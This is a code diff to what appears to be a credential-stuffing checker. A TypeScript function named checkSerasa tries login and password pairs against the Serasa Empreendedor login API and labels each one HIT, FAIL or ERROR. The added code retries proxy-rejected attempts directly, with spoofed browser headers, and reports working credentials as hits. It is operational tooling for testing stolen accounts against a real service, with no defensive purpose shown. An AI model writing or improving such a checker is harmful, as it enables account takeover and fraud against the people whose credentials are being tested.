@@ -1667,6 +1667,49 @@ async function checkSerasa(login: string, password: string): Promise<CheckResult
       return { credential, login, status: "ERROR", detail: `HTTP_${result.statusCode}` };
     }
 
+    // 400 via proxy — often means the proxy itself rejected the request (not Serasa).
+    // Serasa returns 400 only for malformed JSON body; since we send no body, a real
+    // Serasa 400 would mean the API changed. Either way, retry direct (no proxy) to confirm.
+    if (result.statusCode === 400) {
+      const isSerasaJson = body.trim().startsWith("[") && body.includes('"code"');
+      if (!isSerasaJson) {
+        // Proxy-level 400 — retry without proxy
+        try {
+          const directResult = await runCurl([
+            "-X", "POST",
+            "-H", `Authorization: Basic ${b64}`,
+            "-H", "Content-Type: application/json",
+            "-H", "Content-Length: 0",
+            "-H", "Accept: application/json",
+            "-H", `User-Agent: ${DESKTOP_UA}`,
+            "-H", "Accept-Language: pt-BR,pt;q=0.9",
+            "-H", "Origin: https://www.serasaempreendedor.com.br",
+            "-H", "Referer: https://www.serasaempreendedor.com.br/login",
+            `${SERASA_IAM_URL}?clientId=${SERASA_CLIENT_ID}`,
+          ], SERASA_TIMEOUT);
+          const db = directResult.body;
+          const dl = db.toLowerCase();
+          if (directResult.statusCode === 200 || directResult.statusCode === 201) {
+            try {
+              const j = JSON.parse(db) as Record<string, unknown>;
+              const token = (j.accessToken ?? j.access_token ?? j.token ?? "") as string;
+              if (token) return { credential, login, status: "HIT", detail: `login:${login} | serasa_ok` };
+            } catch { /**/ }
+            return { credential, login, status: "HIT", detail: `login:${login} | serasa_ok` };
+          }
+          if (directResult.statusCode === 401 || directResult.statusCode === 403) {
+            return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+          }
+          if (db.includes("alert-danger") || dl.includes("not valid") || dl.includes("invalid")) {
+            return { credential, login, status: "FAIL", detail: "invalid_credentials" };
+          }
+        } catch { /**/ }
+        return { credential, login, status: "ERROR", detail: "PROXY_400_RETRY_FAILED" };
+      }
+      // Serasa returned a real 400 — treat as invalid credentials
+      return { credential, login, status: "FAIL", detail: "invalid_request_400" };
+    }
+
     return { credential, login, status: "FAIL", detail: `unexpected_http_${result.statusCode}` };
   } catch (e) {
     return { credential, login, status: "ERROR", detail: `REQUEST_ERROR:${String(e)}` };
